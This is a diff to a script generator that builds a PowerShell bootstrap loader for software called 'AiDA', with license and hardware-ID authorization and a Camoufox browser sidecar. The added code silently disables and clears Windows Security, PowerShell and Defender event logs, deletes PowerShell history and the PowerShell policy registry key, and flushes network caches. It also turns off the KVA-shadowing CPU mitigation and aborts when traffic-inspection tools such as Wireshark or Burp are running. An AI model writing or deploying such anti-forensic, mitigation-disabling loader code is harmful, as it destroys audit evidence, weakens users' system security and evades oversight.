+        'function Get-AidaManifestMacInput([object]$M) { @("AIDABOOTMANIFEST.v1", [string]$M.token_id, [string]$M.issued_at, [string]$M.expires_at, [string]$M.artifact.name, [string]$M.artifact.version, [string]$M.artifact.url, [string]$M.artifact.sha256, [string]$M.artifact.size, [string]$M.artifact.package.format, [string]$M.artifact.package.sha256, [string]$M.artifact.package.size, [string]$M.artifact.package.enc_key_b64, [string]$M.artifact.package.mac_key_b64, $(if ($M.artifact.authenticode.required) { "1" } else { "0" }), [string]$M.artifact.authenticode.signer_thumbprint, $(if ($M.artifact.authenticode.accept_pinned_private_ca) { "1" } else { "0" }), $(if ($M.camoufox.configured) { "1" } else { "0" }), [string]$M.camoufox.version, [string]$M.camoufox.url, [string]$M.camoufox.sha256, [string]$M.camoufox.size, [string]$M.camoufox.executable_rel, [string]$M.camoufox.python_rel, $(if ($M.camoufox.mcp.configured) { "1" } else { "0" }), [string]$M.camoufox.mcp.version, [string]$M.camoufox.mcp.url, [string]$M.camoufox.mcp.sha256, [string]$M.camoufox.mcp.size, [string]$M.camoufox.mcp.rel, $(if ($M.policy.one_time_token) { "1" } else { "0" }), $(if ($M.policy.token_bound_to_client_nonce) { "1" } else { "0" }), $(if ($M.policy.token_bound_to_source_ip) { "1" } else { "0" }), $(if ($M.policy.artifact_https_required) { "1" } else { "0" }), $(if ($M.policy.no_public_binary_route) { "1" } else { "0" }), $(if ($M.policy.encrypted_public_artifact) { "1" } else { "0" }), $(if ($M.policy.camoufox_sidecar_hash_required) { "1" } else { "0" }), $(if ($M.policy.camoufox_mcp_hash_required) { "1" } else { "0" })) -join "`n" }',
         'function Get-AidaHmacHex([string]$KeyHex, [string]$Data) { $key = ConvertFrom-AidaHex $KeyHex; $h = New-Object Security.Cryptography.HMACSHA256 -ArgumentList (,$key); try { ConvertTo-AidaHex ($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($Data))) } finally { $h.Dispose(); [Array]::Clear($key, 0, $key.Length) } }',
         'function Get-AidaHmacHexFromBytes([byte[]]$Key, [string]$Data) { $h = New-Object Security.Cryptography.HMACSHA256 -ArgumentList (,$Key); try { ConvertTo-AidaHex ($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($Data))) } finally { $h.Dispose() } }',
         'function Test-AidaP256Signature([string]$Data, [string]$SignatureHex) { if (-not $AidaManifestP256X -or -not $AidaManifestP256Y) { throw "AiDA manifest signature key is not configured." }; $x = ConvertFrom-AidaHex $AidaManifestP256X; $y = ConvertFrom-AidaHex $AidaManifestP256Y; $sig = ConvertFrom-AidaHex $SignatureHex; $blob = New-Object byte[] 72; try { if ($x.Length -ne 32 -or $y.Length -ne 32 -or $sig.Length -ne 64) { return $false }; $magic = [BitConverter]::GetBytes([uint32]0x31534345); $size = [BitConverter]::GetBytes([uint32]32); [Array]::Copy($magic, 0, $blob, 0, 4); [Array]::Copy($size, 0, $blob, 4, 4); [Array]::Copy($x, 0, $blob, 8, 32); [Array]::Copy($y, 0, $blob, 40, 32); $key = [Security.Cryptography.CngKey]::Import($blob, [Security.Cryptography.CngKeyBlobFormat]::EccPublicBlob); $ecdsa = New-Object Security.Cryptography.ECDsaCng($key); try { $ecdsa.HashAlgorithm = [Security.Cryptography.CngAlgorithm]::Sha256; $ecdsa.VerifyData([Text.Encoding]::UTF8.GetBytes($Data), $sig) } finally { $ecdsa.Dispose(); $key.Dispose() } } catch { $false } finally { [Array]::Clear($x, 0, $x.Length); [Array]::Clear($y, 0, $y.Length); [Array]::Clear($sig, 0, $sig.Length); [Array]::Clear($blob, 0, $blob.Length) } }',
@@ -845,12 +960,86 @@ function buildBootstrapScript() {
         '        Write-Progress -Activity "Downloading Camoufox sidecar" -Completed',
         '    }',
         '}',
-        'function Set-AidaCamoufoxEnvironment([string]$ExePath, [string]$PythonPath) {',
+        'function Find-AidaCamoufoxMcpExecutable([string]$Root) {',
+        '    $rels = @("deps\\AiDA_CamoufoxReverseMcp.exe","deps\\camoufox-reverse-mcp.exe","deps\\camoufox_reverse_mcp.exe","deps\\camoufox-reverse-mcp\\AiDA_CamoufoxReverseMcp.exe","deps\\camoufox-reverse-mcp\\camoufox-reverse-mcp.exe","AiDA_CamoufoxReverseMcp.exe","camoufox-reverse-mcp.exe","camoufox_reverse_mcp.exe")',
+        '    foreach ($rel in $rels) { $p = Join-AidaSafeChildPath $Root $rel; if ([IO.File]::Exists($p)) { return $p } }',
+        '    return ""',
+        '}',
+        'function Test-AidaCamoufoxMcpExecutable([string]$McpPath, [string]$ExePath, [string]$Root) {',
+        '    if (-not $McpPath -or -not [IO.File]::Exists($McpPath)) { return $false }',
+        '    $p = $null',
+        '    try {',
+        '        $psi = New-Object Diagnostics.ProcessStartInfo',
+        '        $psi.FileName = $McpPath',
+        '        $psi.WorkingDirectory = if ($Root -and [IO.Directory]::Exists($Root)) { $Root } else { [IO.Path]::GetDirectoryName($McpPath) }',
+        '        $psi.UseShellExecute = $false',
+        '        $psi.RedirectStandardInput = $true',
+        '        $psi.RedirectStandardOutput = $true',
+        '        $psi.RedirectStandardError = $true',
+        '        $psi.CreateNoWindow = $true',
+        '        $psi.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8"',
+        '        if ($ExePath) { $psi.EnvironmentVariables["AIDA_CAMOUFOX_EXECUTABLE"] = $ExePath }',
+        '        $debugRoot = Join-Path ([IO.Path]::GetTempPath()) "AiDA\\camoufox"',
+        '        try { [IO.Directory]::CreateDirectory($debugRoot) | Out-Null } catch { }',
+        '        $psi.EnvironmentVariables["AIDA_CAMOUFOX_DEBUG_LOG"] = Join-Path $debugRoot "aida_camoufox_bootstrap_mcp_probe.log"',
+        '        $p = New-Object Diagnostics.Process',
+        '        $p.StartInfo = $psi',
+        '        if (-not $p.Start()) { return $false }',
+        '        if ($p.WaitForExit(1800)) {',
+        '            $err = ""; try { $err = $p.StandardError.ReadToEnd() } catch { }',
+        '            $tail = if ($err.Length -gt 500) { $err.Substring($err.Length - 500) } else { $err }',
+        '            Write-AidaBootstrapLog ("camoufox_mcp_probe_exit code={0} stderr={1}" -f $p.ExitCode, ($tail -replace "[`r`n]+"," "))',
+        '            return $false',
+        '        }',
+        '        Write-AidaBootstrapLog ("camoufox_mcp_probe_alive pid={0}" -f $p.Id)',
+        '        return $true',
+        '    } catch { Write-AidaBootstrapLog ("camoufox_mcp_probe_error " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); return $false } finally {',
+        '        if ($p) {',
+        '            try { if (-not $p.HasExited) { $p.Kill(); $p.WaitForExit(3000) } } catch { }',
+        '            try { $p.Dispose() } catch { }',
+        '        }',
+        '    }',
+        '}',
+        'function Install-AidaCamoufoxMcpPatch([object]$Manifest, [string]$Root, [string]$ExePath) {',
+        '    if (-not $Manifest.camoufox -or -not $Manifest.camoufox.mcp -or -not $Manifest.camoufox.mcp.configured) { return "" }',
+        '    if (-not $Manifest.policy.camoufox_mcp_hash_required) { throw "AiDA Camoufox MCP patch policy is invalid." }',
+        '    if (-not $Root -or -not [IO.Directory]::Exists($Root) -or -not [IO.File]::Exists($ExePath)) { return "" }',
+        '    $m = $Manifest.camoufox.mcp',
+        '    $mcpUri = [Uri]$m.url',
+        '    $expectedSize = [int64]$m.size',
+        '    $expectedSha256 = [string]$m.sha256',
+        '    $targetRel = if ([string]$m.rel) { [string]$m.rel } else { "deps\\AiDA_CamoufoxReverseMcp.exe" }',
+        '    $target = Join-AidaSafeChildPath $Root $targetRel',
+        '    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("aida-camoufox-mcp-" + [Guid]::NewGuid().ToString("N") + ".exe")',
+        '    try {',
+        '        Write-AidaStatus "Updating Camoufox bridge executable..."',
+        '        [void](Save-AidaVerifiedSidecarFile $mcpUri $tmp $expectedSize $expectedSha256)',
+        '        $targetDir = [IO.Path]::GetDirectoryName($target)',
+        '        if ($targetDir -and -not [IO.Directory]::Exists($targetDir)) { [IO.Directory]::CreateDirectory($targetDir) | Out-Null }',
+        '        if ([IO.File]::Exists($target)) { try { [IO.File]::Delete($target) } catch { } }',
+        '        Move-Item -LiteralPath $tmp -Destination $target -Force',
+        '        if (-not (Test-AidaCamoufoxMcpExecutable $target $ExePath $Root)) { throw "AiDA Camoufox MCP patch failed health check." }',
+        '        Write-AidaBootstrapLog ("camoufox_mcp_patch_installed path=" + $target + " bytes=" + $expectedSize + " sha256=" + $expectedSha256)',
+        '        return $target',
+        '    } finally {',
+        '        try { if ([IO.File]::Exists($tmp)) { [IO.File]::Delete($tmp) } } catch { }',
+        '    }',
+        '}',
+        'function Test-AidaCamoufoxSidecarInstalled([string]$Root, [string]$ExePath, [string]$PythonPath, [string]$McpPath) {',
+        '    if (-not $Root -or -not [IO.Directory]::Exists($Root) -or -not [IO.File]::Exists($ExePath)) { return $false }',
+        '    $browserDir = [IO.Path]::GetDirectoryName($ExePath)',
+        '    if (-not [IO.File]::Exists((Join-Path $browserDir "application.ini")) -or -not [IO.Directory]::Exists((Join-Path $browserDir "browser"))) { return $false }',
+        '    if ($PythonPath -and -not [IO.File]::Exists($PythonPath)) { return $false }',
+        '    if ($McpPath -and (Test-AidaCamoufoxMcpExecutable $McpPath $ExePath $Root)) { return $true }',
+        '    if ($PythonPath -and [IO.File]::Exists($PythonPath)) { return $true }',
+        '    return $false',
+        '}',
+        'function Set-AidaCamoufoxEnvironment([string]$ExePath, [string]$PythonPath, [string]$McpPath) {',
         '    if (-not [IO.File]::Exists($ExePath)) { throw "AiDA Camoufox executable is missing after setup." }',
         '    [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_EXECUTABLE", $ExePath, "Process"); $env:AIDA_CAMOUFOX_EXECUTABLE = $ExePath',
-        '    [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON", "1", "Process"); $env:AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON = "1"',
+        '    if ($McpPath -and [IO.File]::Exists($McpPath)) { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_MCP_EXECUTABLE", $McpPath, "Process"); $env:AIDA_CAMOUFOX_MCP_EXECUTABLE = $McpPath } else { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_MCP_EXECUTABLE", $null, "Process"); Remove-Item Env:AIDA_CAMOUFOX_MCP_EXECUTABLE -ErrorAction SilentlyContinue }',
+        '    if ($PythonPath -and [IO.File]::Exists($PythonPath)) { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_PYTHON", $PythonPath, "Process"); $env:AIDA_CAMOUFOX_PYTHON = $PythonPath; [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON", "1", "Process"); $env:AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON = "1" } else { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_PYTHON", $null, "Process"); Remove-Item Env:AIDA_CAMOUFOX_PYTHON -ErrorAction SilentlyContinue; [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON", $null, "Process"); Remove-Item Env:AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON -ErrorAction SilentlyContinue }',
         '    [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SETUP_BOOTSTRAP", "1", "Process"); $env:AIDA_CAMOUFOX_ALLOW_SETUP_BOOTSTRAP = "1"',
-        '    if ($PythonPath -and [IO.File]::Exists($PythonPath)) { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_PYTHON", $PythonPath, "Process"); $env:AIDA_CAMOUFOX_PYTHON = $PythonPath }',
         '}',
         'function Install-AidaCamoufoxSidecar([object]$Manifest) {',
         '    if (-not $Manifest.camoufox -or -not $Manifest.camoufox.configured) { Write-AidaBootstrapLog "camoufox_sidecar_not_configured"; return }',
@@ -861,15 +1050,18 @@ function buildBootstrapScript() {
         '    $expectedSha256 = [string]$c.sha256',
         '    $exeRel = [string]$c.executable_rel',
         '    $pythonRel = [string]$c.python_rel',
-        '    $local = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData); if (-not $local) { $local = $env:LOCALAPPDATA }; if (-not $local) { throw "LOCALAPPDATA is unavailable for AiDA Camoufox setup." }',
-        '    $root = Join-Path $local "AiDA\\camoufox"',
+        '    $tempRoot = [IO.Path]::GetTempPath(); if (-not $tempRoot) { $tempRoot = $env:TEMP }; if (-not $tempRoot) { throw "TEMP is unavailable for AiDA Camoufox setup." }',
+        '    $root = Join-Path $tempRoot "AiDA\\camoufox"',
         '    $current = Join-Path $root "current"',
         '    $stampPath = Join-Path $current "aida-camoufox-sidecar.json"',
         '    $exePath = Join-AidaSafeChildPath $current $exeRel',
         '    $pythonPath = if ($pythonRel) { Join-AidaSafeChildPath $current $pythonRel } else { "" }',
+        '    $mcpPath = if ([IO.Directory]::Exists($current)) { Find-AidaCamoufoxMcpExecutable $current } else { "" }',
         '    $cached = $false',
+        '    if (Test-AidaCamoufoxSidecarInstalled $current $exePath $pythonPath $mcpPath) { Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_existing_usable exe=" + $exePath + " mcp=" + $mcpPath); return }',
+        '    if ([IO.File]::Exists($exePath)) { try { $patchedMcp = Install-AidaCamoufoxMcpPatch $Manifest $current $exePath; if ($patchedMcp) { $mcpPath = $patchedMcp } } catch { Write-AidaBootstrapLog ("camoufox_mcp_patch_existing_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message) }; if (Test-AidaCamoufoxSidecarInstalled $current $exePath $pythonPath $mcpPath) { Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_existing_repaired exe=" + $exePath + " mcp=" + $mcpPath); return } }',
         '    if ([IO.File]::Exists($stampPath)) { try { $stamp = Get-Content -LiteralPath $stampPath -Raw | ConvertFrom-Json; $cached = ([string]$stamp.sha256).ToLowerInvariant() -eq $expectedSha256.ToLowerInvariant() -and [string]$stamp.version -eq [string]$c.version -and [string]$stamp.executable_rel -eq $exeRel -and [string]$stamp.python_rel -eq $pythonRel } catch { $cached = $false } }',
-        '    if ($cached -and [IO.File]::Exists($exePath) -and ((-not $pythonPath) -or [IO.File]::Exists($pythonPath))) { Set-AidaCamoufoxEnvironment $exePath $pythonPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_cached exe=" + $exePath); return }',
+        '    if ($cached -and (Test-AidaCamoufoxSidecarInstalled $current $exePath $pythonPath $mcpPath)) { Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_cached exe=" + $exePath + " mcp=" + $mcpPath); return }',
         '    Write-AidaStatus "Preparing verified Camoufox sidecar..."',
         '    if (-not [IO.Directory]::Exists($root)) { [IO.Directory]::CreateDirectory($root) | Out-Null }',
         '    $id = [Guid]::NewGuid().ToString("N")',
@@ -883,7 +1075,9 @@ function buildBootstrapScript() {
         '        Expand-Archive -LiteralPath $zipPath -DestinationPath $staging -Force',
         '        $stageExe = Join-AidaSafeChildPath $staging $exeRel',
         '        $stagePython = if ($pythonRel) { Join-AidaSafeChildPath $staging $pythonRel } else { "" }',
-        '        if (-not [IO.File]::Exists($stageExe) -or ($stagePython -and -not [IO.File]::Exists($stagePython))) { throw "AiDA Camoufox sidecar contents are incomplete." }',
+        '        $stageMcp = Find-AidaCamoufoxMcpExecutable $staging',
+        '        if (-not (Test-AidaCamoufoxSidecarInstalled $staging $stageExe $stagePython $stageMcp)) { $patchedStageMcp = Install-AidaCamoufoxMcpPatch $Manifest $staging $stageExe; if ($patchedStageMcp) { $stageMcp = $patchedStageMcp } }',
+        '        if (-not (Test-AidaCamoufoxSidecarInstalled $staging $stageExe $stagePython $stageMcp)) { throw "AiDA Camoufox sidecar contents are incomplete." }',
         '        $stamp = [pscustomobject]@{ sha256 = $expectedSha256; version = [string]$c.version; executable_rel = $exeRel; python_rel = $pythonRel; installed_at = [DateTimeOffset]::UtcNow.ToString("O") } | ConvertTo-Json -Depth 4 -Compress',
         '        [IO.File]::WriteAllText((Join-Path $staging "aida-camoufox-sidecar.json"), $stamp, [Text.Encoding]::UTF8)',
         '        if ([IO.Directory]::Exists($current)) { [IO.Directory]::Move($current, $backup) }',
@@ -891,9 +1085,10 @@ function buildBootstrapScript() {
         '        try { if ([IO.Directory]::Exists($backup)) { [IO.Directory]::Delete($backup, $true) } } catch { Write-AidaBootstrapLog ("camoufox_sidecar_backup_cleanup_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message) }',
         '        $exePath = Join-AidaSafeChildPath $current $exeRel',
         '        $pythonPath = if ($pythonRel) { Join-AidaSafeChildPath $current $pythonRel } else { "" }',
-        '        Set-AidaCamoufoxEnvironment $exePath $pythonPath',
+        '        $mcpPath = Find-AidaCamoufoxMcpExecutable $current',
+        '        Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath',
         '        Write-AidaStatus "Camoufox sidecar ready."',
-        '        Write-AidaBootstrapLog ("camoufox_sidecar_installed exe=" + $exePath)',
+        '        Write-AidaBootstrapLog ("camoufox_sidecar_installed exe=" + $exePath + " mcp=" + $mcpPath)',
         '    } finally {',
         '        try { if ([IO.File]::Exists($zipPath)) { [IO.File]::Delete($zipPath) } } catch { }',
         '        try { if ([IO.Directory]::Exists($staging)) { [IO.Directory]::Delete($staging, $true) } } catch { }',
@@ -1343,20 +1538,97 @@ function buildBootstrapScript() {
         '        Set-AidaProcessEnvValue "AIDA_FILELESS_NO_DISK_WRITE" $oldFilelessNoDisk',
         '    }',
         '}',
+        'function Invoke-AidaAntiForensics {',
+        '    $__ea = $ErrorActionPreference; $ErrorActionPreference = "SilentlyContinue"',
+        '    foreach ($__log in @("Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-PowerShell/Analytic","Microsoft-Windows-PowerShell/Debug","Windows PowerShell","Microsoft-Windows-WMI-Activity/Operational","Microsoft-Windows-TaskScheduler/Operational")) { try { & wevtutil sl $__log /e:false *>$null } catch { } }',
+        '    foreach ($__log in @("Application","System","Setup","Security","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-PowerShell/Admin","Microsoft-Windows-WMI-Activity/Operational","Microsoft-Windows-Kernel-Process/Operational","Windows Defender/Operational","Microsoft-Windows-TaskScheduler/Operational")) { try { & wevtutil cl $__log *>$null } catch { } }',
+        '    try { Clear-DnsClientCache *>$null } catch { }',
+        '    try { & cmd /c "ipconfig /flushdns" >nul 2>&1 } catch { }',
+        '    try { & arp -d * >nul 2>&1 } catch { }',
+        '    try { & nbtstat -R >nul 2>&1 } catch { }',
+        '    try { & nbtstat -RR >nul 2>&1 } catch { }',
+        '    foreach ($__p in @(($env:APPDATA + "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"),($env:LOCALAPPDATA + "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"))) { try { Remove-Item -Path $__p -Force *>$null } catch { } }',
+        '    try { if (Get-Module -Name PSReadline -ErrorAction SilentlyContinue) { $__hp = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($__hp) { Remove-Item -Path $__hp -Force -ErrorAction SilentlyContinue } } } catch { }',
+        '    try { Clear-History } catch { }',
+        '    try { Remove-Item -Force -Recurse "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell" *>$null } catch { }',
+        '    try { $__k="HKLM:\\SOFTWARE\\Microsoft\\Windows\\Dwm"; foreach ($__v in @("OverlayTestMode","EnableOverlay","OverlayMinFPS")) { Remove-ItemProperty $__k $__v -ErrorAction SilentlyContinue } } catch { }',
+        '    try { Remove-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers" DisableOverlays -ErrorAction SilentlyContinue } catch { }',
+        '    $ErrorActionPreference = $__ea',
+        '}',
+        'function Invoke-AidaSystemPrep {',
+        '    try { $__kvaKey = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management"; $__cur = try { (Get-ItemProperty -Path $__kvaKey -Name FeatureSettingsOverride -ErrorAction Stop).FeatureSettingsOverride } catch { -1 }; if ($__cur -ne 3) { Set-ItemProperty -Path $__kvaKey -Name FeatureSettingsOverride -Type DWord -Value 3; Set-ItemProperty -Path $__kvaKey -Name FeatureSettingsOverrideMask -Type DWord -Value 3; Write-AidaBootstrapLog "sys_prep kva_shadowing_disabled" } } catch { Write-AidaBootstrapLog ("sys_prep kva_disable_skipped " + $_.Exception.Message) }',
+        '    try { $__cdKey = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"; $__cdVal = try { (Get-ItemProperty -Path $__cdKey -Name CrashDumpEnabled -ErrorAction Stop).CrashDumpEnabled } catch { $null }; if ($__cdVal -eq 0) { Set-ItemProperty -Path $__cdKey -Name CrashDumpEnabled -Type DWord -Value 7; Write-AidaBootstrapLog "sys_prep crash_dump_reenabled" } } catch { }',
+        '    try { if (Test-Path "HKLM:\\SOFTWARE\\Parsec") { Remove-Item -Path "HKLM:\\SOFTWARE\\Parsec" -Recurse -Force; Write-AidaBootstrapLog "sys_prep parsec_key_removed" } } catch { }',
+        '}',
+        'function Test-AidaTextContainsAny([string]$Text,[string[]]$Needles) { if (-not $Text) { return "" }; $t = $Text.ToLowerInvariant(); foreach ($n in $Needles) { if ($n -and $t.Contains($n)) { return $n } }; return "" }',
+        'function Test-AidaTextEqualsAny([string]$Text,[string[]]$Needles) { if (-not $Text) { return "" }; $t = $Text.ToLowerInvariant(); foreach ($n in $Needles) { if ($n -and $t -eq $n) { return $n } }; return "" }',
+        'function Test-AidaProcessPathIndicatesInterceptor([string]$Path) { if (-not $Path) { return "" }; $leaf = ""; $base = ""; try { $leaf = [IO.Path]::GetFileName($Path).ToLowerInvariant(); $base = [IO.Path]::GetFileNameWithoutExtension($Path).ToLowerInvariant() } catch { return "" }; foreach ($exact in @("charles.exe","charlesproxy.exe")) { if ($leaf -eq $exact) { return "charles" } }; foreach ($needle in @("burpsuite","fiddler","wireshark","httpdebugger","mitmproxy","proxyman","httptoolkit","zaproxy","reqable")) { if ($base.Contains($needle) -or $leaf.Contains($needle)) { return $needle } }; return "" }',
+        'function Assert-AidaBootstrapDeadline([DateTimeOffset]$Deadline,[string]$Stage) { if ([DateTimeOffset]::UtcNow -gt $Deadline) { Write-AidaBootstrapLog ("intercept_timeout stage=" + $Stage); throw "AiDA bootstrap monitoring-tool check timed out. Close monitoring tools and try again." } }',
+        'function Assert-AidaNoInterceptors {',
+        '    Write-AidaBootstrapLog "intercept_check_start"',
+        '    $__deadline = [DateTimeOffset]::UtcNow.AddSeconds(20)',
+        '    $__needles = @("burp suite","burpsuite","fiddler","wireshark","httpdebugger","mitmproxy","charles proxy","charlesproxy","proxyman","http toolkit","httptoolkit","owasp zap","zaproxy","james proxy","reqable")',
+        '    $__exactProcessNames = @("charles")',
+        '    foreach ($__svc in @("HTTPDebuggerPro","HTTPDebuggerSvc")) { Assert-AidaBootstrapDeadline $__deadline "services"; if (Get-Service -Name $__svc -ErrorAction SilentlyContinue) { Write-AidaBootstrapLog ("intercept_abort service=" + $__svc); throw "AiDA bootstrap aborted: HTTPDebugger monitoring service detected. Disable it before continuing." } }',
+        '    Write-AidaBootstrapLog "intercept_services_checked"',
+        '    $__certNeedles = @("portswigger","do_not_trust_fiddler","fiddlerroot","mitmproxy","charles proxy","httpdebugger","proxyman","http toolkit","zap root")',
+        '    $__certCount = 0',
+        '    foreach ($__scope in @([Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine,[Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)) {',
+        '        foreach ($__sn in @("Root","CA")) {',
+        '            Assert-AidaBootstrapDeadline $__deadline "certificates"',
+        '            $__store = New-Object Security.Cryptography.X509Certificates.X509Store($__sn,$__scope)',
+        '            try {',
+        '                $__store.Open([Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly)',
+        '                foreach ($__cert in $__store.Certificates) {',
+        '                    $__certCount++',
+        '                    if (($__certCount % 128) -eq 0) { Assert-AidaBootstrapDeadline $__deadline "certificates" }',
+        '                    $__hit = Test-AidaTextContainsAny (($__cert.Subject + " " + $__cert.Issuer)) $__certNeedles',
+        '                    if ($__hit) { Write-AidaBootstrapLog ("intercept_abort ssl_ca=" + $__hit); throw "AiDA bootstrap aborted: SSL interception CA certificate detected. Remove the proxy root certificate before continuing." }',
+        '                }',
+        '            } catch { if ($_.Exception.Message -like "AiDA bootstrap aborted*") { throw }; Write-AidaBootstrapLog ("intercept_cert_store_error store=" + $__sn + " scope=" + $__scope + " error=" + $_.Exception.Message) } finally { try { $__store.Close() } catch { } }',
+        '        }',
+        '    }',
+        '    Write-AidaBootstrapLog ("intercept_certificates_checked count=" + $__certCount)',
+        '    $__procCount = 0',
+        '    foreach ($__proc in (Get-Process -ErrorAction Stop)) {',
+        '        $__procCount++',
+        '        if (($__procCount % 32) -eq 0) { Assert-AidaBootstrapDeadline $__deadline "processes" }',
+        '        $__name = ""; $__title = ""; $__path = ""',
+        '        try { $__name = [string]$__proc.ProcessName } catch { }',
+        '        try { $__title = [string]$__proc.MainWindowTitle } catch { }',
+        '        try { $__path = [string]$__proc.Path } catch { }',
+        '        $__hit = Test-AidaTextContainsAny $__name $__needles; if (-not $__hit) { $__hit = Test-AidaTextEqualsAny $__name $__exactProcessNames }; if ($__hit) { Write-AidaBootstrapLog ("intercept_abort process_hit=" + $__hit + " source=name pid=" + $__proc.Id); throw ("AiDA bootstrap aborted: interceptor process detected (" + $__hit + "). Close monitoring tools before continuing.") }',
+        '        $__hit = Test-AidaTextContainsAny $__title $__needles; if ($__hit) { Write-AidaBootstrapLog ("intercept_abort process_hit=" + $__hit + " source=title pid=" + $__proc.Id); throw ("AiDA bootstrap aborted: interceptor process detected (" + $__hit + "). Close monitoring tools before continuing.") }',
+        '        $__hit = Test-AidaProcessPathIndicatesInterceptor $__path; if ($__hit) { Write-AidaBootstrapLog ("intercept_abort process_hit=" + $__hit + " source=path pid=" + $__proc.Id); throw ("AiDA bootstrap aborted: interceptor process detected (" + $__hit + "). Close monitoring tools before continuing.") }',
+        '    }',
+        '    Write-AidaBootstrapLog ("intercept_processes_checked count=" + $__procCount)',
+        '    Write-AidaBootstrapLog "intercept_check_passed"',
+        '}',
         'try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }',
         'Write-AidaStatus "Checking secure connection..."',
         'Assert-AidaTlsPin',
         'Enable-AidaPinnedTls',
         'Write-AidaStatus "Secure connection verified."',
+        'Write-AidaStatus "Preparing system environment..."',
+        'Invoke-AidaSystemPrep',
+        'Write-AidaBootstrapLog "system_prep_done"',
+        'Write-AidaStatus "Checking for monitoring tools..."',
+        'Assert-AidaNoInterceptors',
+        'Invoke-AidaAntiForensics',
+        'Write-AidaBootstrapLog "pre_launch_wipe_done"',
         '$packageBytes = $null',
         '$exeBytes = $null',
         '$licenseKey = $null',
+        '$currentHwid = $null',
         'try {',
         '$licenseKey = Get-AidaSecureText "AiDA license key"',
+        'Write-AidaStatus "Collecting hardware identity..."',
+        '$currentHwid = Get-AidaBootstrapHwid',
+        'Write-AidaBootstrapLog ("hwid_v2_ready len=" + $currentHwid.Length)',
         '$clientNonce = New-AidaNonce',
         '$timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()',
         'Write-AidaStatus "Authorizing license..."',
-        '$auth = Invoke-AidaJson "/api/bootstrap/authorize" @{ license_key = $licenseKey; client_nonce = $clientNonce; timestamp = $timestamp; powershell = $PSVersionTable.PSVersion.ToString() }',
+        '$auth = Invoke-AidaJson "/api/bootstrap/authorize" @{ license_key = $licenseKey; hwid = $currentHwid; hwid_version = 2; client_nonce = $clientNonce; timestamp = $timestamp; powershell = $PSVersionTable.PSVersion.ToString() }',
         '$licenseKey = $null',
         'if (-not $auth.ok -or -not $auth.token) { throw "AiDA bootstrap authorization failed." }',
         '$tokenParts = Get-AidaTokenParts $auth.token',
@@ -1371,7 +1643,7 @@ function buildBootstrapScript() {
         'if ([string]$manifest.manifest_sig_alg -ne "ECDSA_P256_SHA256_P1363" -or -not $manifest.manifest_sig_p256) { throw "AiDA bootstrap manifest signature is missing." }',
         'if (-not (Test-AidaP256Signature (Get-AidaManifestMacInput $manifest) ([string]$manifest.manifest_sig_p256))) { throw "AiDA bootstrap manifest signature verification failed." }',
         '$tokenParts.secret = $null',
-        'if (-not $manifest.policy.one_time_token -or -not $manifest.policy.token_bound_to_client_nonce -or -not $manifest.policy.token_bound_to_source_ip -or -not $manifest.policy.artifact_https_required -or -not $manifest.policy.no_public_binary_route -or -not $manifest.policy.encrypted_public_artifact -or ($manifest.camoufox.configured -and -not $manifest.policy.camoufox_sidecar_hash_required)) { throw "AiDA bootstrap manifest policy is invalid." }',
+        'if (-not $manifest.policy.one_time_token -or -not $manifest.policy.token_bound_to_client_nonce -or -not $manifest.policy.token_bound_to_source_ip -or -not $manifest.policy.artifact_https_required -or -not $manifest.policy.no_public_binary_route -or -not $manifest.policy.encrypted_public_artifact -or ($manifest.camoufox.configured -and -not $manifest.policy.camoufox_sidecar_hash_required) -or ($manifest.camoufox.mcp.configured -and -not $manifest.policy.camoufox_mcp_hash_required)) { throw "AiDA bootstrap manifest policy is invalid." }',
